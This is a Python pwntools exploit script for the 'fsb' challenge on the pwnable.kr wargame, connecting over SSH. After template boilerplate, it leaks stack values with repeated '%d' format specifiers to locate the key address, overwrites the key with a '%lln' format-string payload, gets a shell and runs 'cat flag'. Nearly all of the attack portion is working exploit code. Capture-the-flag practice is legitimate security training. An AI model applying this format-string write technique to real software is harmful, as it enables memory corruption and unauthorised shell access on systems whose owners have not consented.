#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user fsb ./fsb
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fsb')
context.update(terminal=["tmux", "splitw", "-h"])

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'fsb'
password = args.PASSWORD or 'guest'
remote_path = 'fsb'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# basically we wait until key & 0x12345 is small enough, so that the key pointer from
# main's stack frame is close enough, then overwrite it.

KEY_ADDR = 0x804a060

for _ in range(64):
    io = start()

    io.recvline()  # give me some...

    io.send(b"%d " * 33 + b"\n")

    leaked_stack = [int(x) for x in io.recvline().split()]

    if KEY_ADDR in leaked_stack:
        key_addr_offset = leaked_stack.index(KEY_ADDR)
        break

    io.close()

else:
    log.error("out of luck, try again :(")

io.recvline()  # give me some...
io.send(b"%8x" * key_addr_offset + b"%lln" + b"\x00")

io.recvline()  # give me some...
io.send(b"whatever\x00")

io.recvline()  # give me some...
io.send(b"whatever\x00")

# overwritten key value
io.send(str(8 * key_addr_offset).encode("utf-8") + b"\x00")

io.recvuntil(b"Congratz!\n")

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip().removeprefix('$ '))}'")
